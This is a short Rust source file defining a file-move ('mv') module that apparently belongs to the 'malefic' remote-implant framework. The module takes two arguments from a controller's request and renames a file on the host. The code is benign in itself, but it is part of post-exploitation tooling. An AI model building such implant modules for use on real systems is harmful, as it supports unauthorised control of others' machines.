use crate::prelude::*;

pub struct Mv {}

#[async_trait]
#[module_impl("mv")]
impl Module for Mv {}

#[async_trait]
impl malefic_proto::module::ModuleImpl for Mv {
    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, _sender: &mut malefic_proto::module::Output) -> ModuleResult {
        let request = check_request!(receiver, Body::Request)?;

        let args = check_field!(request.args, 2)?;

        if let [src, dst] = &args[..] {
            std::fs::rename(&src, &dst)?;
        }

        Ok(TaskResult::new(id))
    }
}